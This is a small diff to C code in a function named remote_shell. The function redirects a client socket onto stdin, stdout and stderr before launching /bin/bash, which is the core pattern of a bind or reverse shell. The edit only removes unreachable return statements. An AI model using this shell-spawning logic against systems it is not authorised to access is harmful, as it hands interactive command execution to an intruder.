@@ -98,17 +98,14 @@ remote_shell(char **env) {
     if (dup2(client_fd, STDIN_FILENO) == -1) {
         __log(stderr, "(dup2 [src_fd %d target_fd 0]) Error: %s\n", client_fd, strerror(errno));
         goto client_error;
-        return 1;
     }
     if (dup2(client_fd, STDOUT_FILENO) == -1) {
         __log(stderr, "(dup2 [src_fd %d target_fd 1]) Error: %s\n", client_fd, strerror(errno));
         goto client_error;
-        return 1;
     }
     if (dup2(client_fd, STDERR_FILENO) == -1) {
         __log(stderr, "(dup2 [src_fd %d target_fd 2]) Error: %s\n", client_fd, strerror(errno));
         goto client_error;
-        return 1;
     }
 
     const char *bash_exec_path = "/bin/bash";
